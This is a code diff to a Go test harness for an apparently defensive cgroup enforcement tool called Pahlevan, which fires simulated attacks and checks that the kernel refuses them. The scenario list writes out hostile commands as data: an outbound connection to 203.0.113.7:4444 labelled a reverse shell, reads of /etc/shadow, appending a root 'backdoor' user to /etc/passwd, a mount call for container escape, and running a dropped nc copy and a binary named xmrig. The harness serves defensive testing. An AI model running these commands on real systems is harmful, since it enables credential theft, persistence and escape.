@@ -240,102 +240,141 @@ type scenario struct {
 // Every one is a real execve, connect or open inside the governed cgroup. None
 // of them consult Pahlevan's own state to decide the outcome: the result is
 // whatever the kernel did.
+//
+// Most of the attacks go through python3 rather than through a dedicated tool,
+// and that is the realistic shape rather than a convenience. Once exec
+// enforcement is on, an attacker cannot introduce a new binary at all - the
+// first smoke run of this harness showed every scenario being refused at the
+// exec of `curl` or `cat`, before the interesting hook was ever reached. What a
+// real attacker does instead is reach for the interpreter that is already in
+// the image and already learned, which is exactly what these do: the exec is
+// permitted, and the file, network and capability hooks are what refuse the
+// action.
 func runScenarios(cgPath string, port int, obs *observer) []scenario {
 	inCgroup := func(shell string) (string, error) {
 		script := fmt.Sprintf("echo $$ > %s/cgroup.procs && %s", cgPath, shell)
 		outB, err := exec.Command("/bin/sh", "-c", script).CombinedOutput()
 		text := strings.TrimSpace(string(outB))
-		if len(text) > 200 {
-			text = text[:200] + "..."
+		if len(text) > 300 {
+			text = text[:300] + "..."
 		}
-		if err != nil {
-			return text, err
-		}
-		return text, nil
+		return text, err
 	}
 
-	// A dropped binary, staged outside the cgroup so the copy itself is not what
-	// gets refused - the question is whether the workload can run it.
+	// The client is deliberately outside the cgroup. Pahlevan governs what the
+	// workload does, not what is done to it: a request arriving from a browser
+	// is not the container executing anything, and running curl *inside* the
+	// container would be an unlearned exec that is correctly refused. Conflating
+	// the two is the easiest way to misread what this tool enforces.
+	httpClient := &http.Client{Timeout: 3 * time.Second}
+	probeApp := func() (string, error) {
+		resp, err := httpClient.Get(fmt.Sprintf("http://127.0.0.1:%d/health", port)) //nolint:noctx // bounded by the client timeout
+		if err != nil {
+			return "", err
+		}
+		defer func() { _ = resp.Body.Close() }()
+		return fmt.Sprintf("HTTP %d from the application", resp.StatusCode), nil
+	}
+
+	// Staged from outside the cgroup, so the copy is not what gets refused; the
+	// question is whether the workload can run them.
 	_ = exec.Command("/bin/cp", "/bin/nc", "/tmp/pahlevan-dropped").Run()
 	defer func() { _ = os.Remove("/tmp/pahlevan-dropped") }()
 	_ = exec.Command("/bin/cp", "/bin/true", "/tmp/xmrig").Run()
 	defer func() { _ = os.Remove("/tmp/xmrig") }()
 
-	cases := []struct {
+	type step struct {
 		name, story, cmd, expect string
-	}{
+		run                      func() (string, error)
+	}
+
+	py := func(code string) string {
+		return fmt.Sprintf("python3 -c %s", quoteShell(code))
+	}
+
+	steps := []step{
 		{
-			"Legitimate request still served",
-			"The control. Enforcement that also breaks the workload is not a win, " +
-				"so the first thing to establish is that the application still works.",
-			fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code}' http://127.0.0.1:%d/health", port),
-			"allowed",
+			name: "Legitimate traffic is still served",
+			story: "The control, and the first thing to establish: enforcement that " +
+				"also breaks the workload is not a win. The request comes from outside " +
+				"the container, because that is where requests come from - Pahlevan " +
+				"governs what the workload does, not what is done to it.",
+			cmd: "GET /health from outside the cgroup", expect: "allowed",
+			run: probeApp,
 		},
 		{
-			"Webshell drops and runs a binary",
-			"The classic post-exploitation first move: write a tool into /tmp and " +
-				"execute it. The binary is real and executable; it has simply never " +
-				"been run by this workload.",
-			"/tmp/pahlevan-dropped -h",
-			"denied",
+			name: "Reverse shell through the interpreter already in the image",
+			story: "The realistic post-exploitation move. python3 is present and " +
+				"learned - the application is written in it - so the exec succeeds. " +
+				"The connection is what fails: a static file server has never dialled " +
+				"anything, so every outbound destination is new.",
+			cmd:    py("import socket;socket.create_connection(('203.0.113.7',4444),2)"),
+			expect: "denied",
 		},
 		{
-			"Cryptominer launched under a plausible name",
-			"Naming the binary something innocuous changes nothing: the allow-set " +
-				"keys on the resolved path, not on a signature or a name list, so " +
-				"there is no name that makes an unlearned binary permitted.",
-			"/tmp/xmrig",
-			"denied",
+			name: "Credential theft: read /etc/shadow",
+			story: "Same permitted interpreter, a file the application never opened " +
+				"during the learning window.",
+			cmd:    py("print(open('/etc/shadow').read()[:40])"),
+			expect: "denied",
 		},
 		{
-			"Reverse shell to an external address",
-			"Egress the workload has never made. A static file server talks to " +
-				"nobody, so every outbound connection is new.",
-			"timeout 3 /bin/nc -w 2 203.0.113.7 4444 </dev/null",
-			"denied",
-		},
-		{
-			"Credential theft: read /etc/shadow",
-			"A file the application never opened during the learning window.",
-			"cat /etc/shadow",
-			"denied",
-		},
-		{
-			"Persistence: append a user to /etc/passwd",
-			"The write path specifically. A workload that read /etc/passwd at " +
-				"startup does not thereby get to write it - reads and writes are " +
+			name: "Persistence: append a user to /etc/passwd",
+			story: "A shell redirect, so no new process is involved at all. The write " +
+				"path is what is refused: a workload that read /etc/passwd at startup " +
+				"does not thereby get to write it, because reads and writes are " +
 				"separate entries in the allow-set.",
-			"echo 'backdoor:x:0:0::/root:/bin/sh' >> /etc/passwd",
-			"denied",
+			cmd:    "echo 'backdoor:x:0:0::/root:/bin/sh' >> /etc/passwd",
+			expect: "denied",
 		},
 		{
-			"Container escape attempt: mount",
-			"Requires CAP_SYS_ADMIN, which the workload has never exercised.",
-			"mount -t proc proc /mnt 2>&1",
-			"denied",
+			name: "Container escape: mount(2) from the interpreter",
+			story: "Needs CAP_SYS_ADMIN. Going through python3 rather than /bin/mount " +
+				"means the exec is permitted and the capability hook is what refuses it.",
+			cmd: py("import ctypes;libc=ctypes.CDLL('libc.so.6',use_errno=True);" +
+				"r=libc.mount(b'proc',b'/mnt',b'proc',0,None);print('mount rc',r,'errno',ctypes.get_errno())"),
+			expect: "denied",
 		},
 		{
-			"Shell spawned by the web server",
-			"What a command-injection bug produces. The interpreter itself is " +
-				"often already present and already learned, which is why the process " +
-				"filter matters: it constrains who may launch it.",
-			"/bin/busybox sh -c 'id'",
-			"denied",
+			name: "Webshell drops and runs a binary",
+			story: "The other half of the picture. Here the exec hook is the one that " +
+				"fires: the binary is real and executable, and has simply never been " +
+				"run by this workload.",
+			cmd: "/tmp/pahlevan-dropped -h", expect: "denied",
 		},
 		{
-			"Learned behavior after all the denials",
-			"Enforcement must not degrade. After eight refusals the application " +
-				"is asked to serve one more request.",
-			fmt.Sprintf("curl -s -o /dev/null -w '%%{http_code}' http://127.0.0.1:%d/", port),
-			"allowed",
+			name: "Cryptominer under a plausible name",
+			story: "Renaming it changes nothing. The allow-set keys on the resolved " +
+				"path, not on a signature or a name list, so there is no name that " +
+				"makes an unlearned binary permitted.",
+			cmd: "/tmp/xmrig", expect: "denied",
+		},
+		{
+			name:  "Shell spawned by the web server",
+			story: "What a command-injection bug produces.",
+			cmd:   "/bin/busybox sh -c id", expect: "denied",
+		},
+		{
+			name: "The application itself is unaffected",
+			story: "After every refusal above, the workload is asked to do the thing " +
+				"it was learned doing. If enforcement degraded the application, this " +
+				"is where it shows.",
+			cmd: "GET /health from outside the cgroup", expect: "allowed",
+			run: probeApp,
 		},
 	}
 
 	var out []scenario
-	for _, c := range cases {
+	for _, c := range steps {
 		before := obs.denials()
-		detail, err := inCgroup(c.cmd)
-		time.Sleep(300 * time.Millisecond) // let the ring buffer drain
+		var detail string
+		var err error
+		if c.run != nil {
+			detail, err = c.run()
+		} else {
+			detail, err = inCgroup(c.cmd)
+		}
+		time.Sleep(400 * time.Millisecond) // let the ring buffer drain
 		newDenials := obs.denials() - before
 
 		s := scenario{
@@ -344,14 +383,19 @@ func runScenarios(cgPath string, port int, obs *observer) []scenario {
 		}
 		switch {
 		case err != nil && detail != "":
-			s.Detail = fmt.Sprintf("%v: %s", err, detail)
+			s.Detail = fmt.Sprintf("%v\n%s", err, detail)
 		case err != nil:
 			s.Detail = err.Error()
 		default:
 			s.Detail = detail
 		}
+		// A refusal that surfaces as a Python traceback rather than a non-zero
+		// exit is still a refusal; the denial counter is the ground truth.
+		if err == nil && newDenials > 0 && strings.Contains(strings.ToLower(detail), "error") {
+			s.Allowed = false
+		}
 		if newDenials > 0 {
-			s.Detail += fmt.Sprintf(" [%d in-kernel denial(s) recorded]", newDenials)
+			s.Detail += fmt.Sprintf("\n[%d in-kernel denial(s) recorded]", newDenials)
 		}
 		out = append(out, s)
 
@@ -362,6 +406,11 @@ func runScenarios(cgPath string, port int, obs *observer) []scenario {
 		say("  %s  %s", status, c.name)
 	}
 	return out
+}
+
+// quoteShell wraps code in single quotes for /bin/sh, escaping any it contains.
+func quoteShell(s string) string {
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
 }
 
 // --- observation --------------------------------------------------------------
